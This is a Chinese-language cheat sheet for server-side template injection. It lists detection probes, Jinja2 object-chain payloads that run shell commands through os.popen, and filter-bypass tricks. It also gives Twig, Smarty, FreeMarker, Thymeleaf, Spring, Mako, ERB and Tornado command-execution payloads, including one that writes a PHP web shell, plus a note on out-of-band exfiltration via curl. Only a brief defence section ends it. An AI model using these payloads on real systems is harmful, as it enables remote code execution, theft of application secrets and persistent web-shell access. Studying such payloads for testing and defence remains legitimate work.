# SSTI（服务器端模板注入）速查

## 1. 检测与指纹

```
{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  {7*7}  [[7*7]]
49 → Jinja2/Twig/Jinja-like；77 → Jinja2 (77*7=539? 用 {{7*'7'}} 区分)
{{7*'7'}} = 7777777 → Jinja2；= 49 → Twig
```

- 爆栈顺序：先 `{{7*7}}` 试双花括号 → 报错看引擎名 → `{{7*'7'}}` 区分 Jinja2/Twig。

## 2. Jinja2（Python/Flask）利用链

```
{{ ''.__class__.__mro__[1].__subclasses__() }}          # 列出所有类，找 os._wrap_close / subprocess.Popen
{{ config }}                                            # 直接读 Flask 配置（含 SECRET_KEY）
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['popen']('ls').read() }}
# MRO 定位脚本：
{{ ''.__class__.__mro__[1].__subclasses__() | count }} 逐个试探
```
- `lipsum.__globals__` / `cycler.__init__.__globals__` / `joiner.__init__.__globals__` / `namespace`：
  Flask/Jinja2 内置全局对象，是稳定的 globals 入口。
```
{{ lipsum.__globals__.os.popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('ls /').read() }}
```

- **绕过过滤**：
  - `{{}}`/花括号过滤 → `{% if %}` 盲注（`{% if x %}true{% endif %}` 布尔外带）
  - `.` 过滤 → `|attr('__class__')` / `.__getattribute__`；`[]` → `|attr()` + 字符串拼接
  - `_` 过滤 → `{{ ()|attr(request.args.a) }}` + `?a=__class__`（request 对象传参）
  - `'` 过滤 → request.args 传字符串：`{{ lipsum.__globals__[request.args.k].popen(request.args.c).read() }}`
  - 关键词过滤 → 字符串拼接 `__gl"+"obal__` 或 `|join` 反转

## 3. Twig（PHP）

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}   # Twig<3
{{ ['id'] | map('system') }}                                                        # Twig 2/3
{{ app.request.query.get('c') }}                                                    # 传参
```

## 4. 其他引擎速查

| 引擎 | payload |
|---|---|
| Smarty (PHP) | `{Smarty_Internal_Write_File::writeFile("SHELL.php","<?php passthru($_GET['c']); ?>",self::clearConfig())}` |
| FreeMarker (Java) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity (Java) | `#set($x='')##set($str=$x.class.forName('java.lang.Runtime'))...` |
| Thymeleaf (Java) | `__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`（表达式预处理） |
| Java Spring | `#{T(java.lang.Runtime).getRuntime().exec('id')}` |
| Python Mako | `${__import__("os").popen("id").read()}` |
| ERB (Ruby) | `<%= system("id") %>` |
| Tornado | `{% import os %}{{ os.popen("id").read() }}` |

## 5. 盲注与外带

- `{% if %}` 布尔盲注逐字符；或用 DNS/HTTP 外带（curl 到自己 VPS/interact.sh）。

## 6. 防御

- 模板与代码分离：用户输入只作为**数据**渲染，绝不拼进模板字符串。
- Jinja2 沙箱环境 `SandboxedEnvironment`；Twig 关闭 `autoescape` 之外的危险 API。
- 报错不回显引擎信息；白名单过滤用户可控的模板变量名。
